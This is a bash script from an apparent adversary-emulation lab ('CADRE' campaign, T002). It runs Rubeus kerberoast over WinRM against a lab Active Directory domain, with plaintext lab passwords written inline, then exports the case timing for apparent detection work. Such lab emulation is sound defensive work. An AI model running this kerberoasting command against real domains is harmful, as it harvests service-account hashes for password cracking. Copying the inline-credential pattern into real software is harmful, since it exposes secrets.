#!/usr/bin/env bash
# T002 — Kerberoast from ws01 (analyst_t1 WinRM; intern_blue cred in-process for ACE#18)
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T002-KERB-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T002 | ${CASE_ID} | T0=${T0} ==="

ws01_ensure_rubeus

echo "--- Kerberoast via Rubeus using intern_blue credentials (AVOIDS double-hop / password reset) ---"
ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  'C:\Tools\cadre-attack\Rubeus.exe kerberoast /creduser:child.cadre.local\intern_blue /credpassword:1nt3rn_Blu3! /creddomain:child.cadre.local /domain:child.cadre.local /dc:dc02.child.cadre.local /nowrap'

cadre_export "${CASE_ID}" T002 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
